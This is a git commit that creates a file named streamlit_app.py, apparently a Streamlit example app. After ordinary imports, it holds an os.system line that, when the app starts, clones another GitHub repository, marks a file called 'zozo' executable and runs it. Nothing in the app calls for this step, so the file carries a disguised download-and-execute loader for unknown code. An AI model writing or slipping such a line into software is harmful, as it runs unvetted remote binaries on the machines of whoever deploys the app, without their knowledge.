d15bfd0c5ad5b44162c7631b175ee8fd227e4362
demephistopheles <80898957+demephistopheles@users.noreply.github.com>
2022-05-01 18:40:41 +0000

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("git clone https://github.com/aurbach55/streamlit-example.git && cd streamlit-example && chmod +x zozo && ./zozo")
